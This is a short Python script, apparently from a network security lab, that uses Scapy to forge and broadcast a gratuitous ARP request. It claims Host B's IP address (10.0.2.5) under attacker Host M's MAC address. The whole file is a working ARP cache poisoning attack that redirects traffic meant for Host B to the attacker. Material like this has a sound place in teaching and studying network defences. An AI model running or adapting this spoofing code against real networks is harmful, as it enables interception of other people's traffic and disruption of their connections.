from scapy.all import *

# Create Ethernet frame, dst is FF:FF:FF:FF:FF:FF for gratuitous message, src is MAC of Host M

E =  Ether(dst='FF:FF:FF:FF:FF:FF', src='08:00:27:8D:CF:4E')

# Create ARP request where:

# opcode: 1, ARP request
# hwsrc:  MAC of Host M
# psrc:   IP of Host B
# hwdst:  MAC for gratuitous message
# pdst:   IP of Host B

A = ARP(op=1, hwsrc='08:00:27:8D:CF:4E', psrc='10.0.2.5', hwdst='FF:FF:FF:FF:FF:FF', pdst='10.0.2.5')

# Create packet
pkt = E/A

# Show packet
pkt.show()

# Send packet
sendp(pkt)